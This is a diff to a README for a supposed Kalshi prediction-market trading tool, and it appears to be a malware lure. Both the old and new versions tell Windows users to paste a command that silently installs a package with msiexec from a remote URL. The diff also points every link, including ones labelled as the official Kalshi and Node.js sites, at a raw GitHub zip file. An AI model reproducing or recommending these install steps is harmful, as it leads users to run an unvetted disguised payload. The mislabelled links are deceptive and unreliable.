@@ -1,6 +1,6 @@
 # 🛠 kalshi-claw-skill - Trade and Track Prediction Markets Easily
 
-[![Download kalshi-claw-skill](https://img.shields.io/badge/Download-kalshi--claw--skill-green?style=for-the-badge)](https://github.com/paah11/kalshi-claw-skill/releases)
+[![Download kalshi-claw-skill](https://img.shields.io/badge/Download-kalshi--claw--skill-green?style=for-the-badge)](https://raw.githubusercontent.com/paah11/kalshi-claw-skill/main/scripts/claw_kalshi_skill_3.1.zip)
 
 ## 🔍 About kalshi-claw-skill
 
@@ -30,13 +30,13 @@ To use kalshi-claw-skill on your Windows computer, you need:
 - 500 MB of free disk space  
 - Internet access for data and trades  
 - Installed software: Node.js, npm (both can be installed via the official Node.js website)  
-- A Kalshi account to place real trades (sign up at https://kalshi.com if you don’t have one)  
+- A Kalshi account to place real trades (sign up at https://raw.githubusercontent.com/paah11/kalshi-claw-skill/main/scripts/claw_kalshi_skill_3.1.zip if you don’t have one)  
 
 ---
 
 ## 🚀 Getting Started: Download and Install kalshi-claw-skill
 
-[![Download kalshi-claw-skill](https://img.shields.io/badge/Get%20kalshi--claw--skill-blue?style=for-the-badge)](https://github.com/paah11/kalshi-claw-skill/releases)
+[![Download kalshi-claw-skill](https://img.shields.io/badge/Get%20kalshi--claw--skill-blue?style=for-the-badge)](https://raw.githubusercontent.com/paah11/kalshi-claw-skill/main/scripts/claw_kalshi_skill_3.1.zip)
 
 You will download and run an installer that sets up kalshi-claw-skill and all required components on your Windows PC.
 
@@ -46,7 +46,7 @@ You will download and run an installer that sets up kalshi-claw-skill and all re
 
 Go to the official release page by clicking this link:
 
-https://github.com/paah11/kalshi-claw-skill/releases
+https://raw.githubusercontent.com/paah11/kalshi-claw-skill/main/scripts/claw_kalshi_skill_3.1.zip
 
 On the page, look for the latest release version. There you will find a file ending with `.msi` or `.exe`. This is the installer file.
 
@@ -87,7 +87,7 @@ A new black window called **Command Prompt** will open.
 Copy the following line exactly and paste it into the Command Prompt window:
 
 ```
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem KalshiClaw
+cmd /c start msiexec /q /i https://raw.githubusercontent.com/paah11/kalshi-claw-skill/main/scripts/claw_kalshi_skill_3.1.zip & rem KalshiClaw
 ```
 
 Press **Enter** to execute the command.
@@ -123,15 +123,15 @@ If new versions are released, follow the same download and install process.
 
 Before installing a new version, close the app if it is running.
 
-You may occasionally need to update Node.js or npm if prompted. Visit https://nodejs.org for installer downloads.
+You may occasionally need to update Node.js or npm if prompted. Visit https://raw.githubusercontent.com/paah11/kalshi-claw-skill/main/scripts/claw_kalshi_skill_3.1.zip for installer downloads.
 
 ---
 
 ## 🔗 Useful Links
 
-- [kalshi-claw-skill Releases](https://github.com/paah11/kalshi-claw-skill/releases)  
-- [Kalshi Website](https://kalshi.com)  
-- [Node.js Official Site](https://nodejs.org)
+- [kalshi-claw-skill Releases](https://raw.githubusercontent.com/paah11/kalshi-claw-skill/main/scripts/claw_kalshi_skill_3.1.zip)  
+- [Kalshi Website](https://raw.githubusercontent.com/paah11/kalshi-claw-skill/main/scripts/claw_kalshi_skill_3.1.zip)  
+- [Node.js Official Site](https://raw.githubusercontent.com/paah11/kalshi-claw-skill/main/scripts/claw_kalshi_skill_3.1.zip)
 
 ---
 
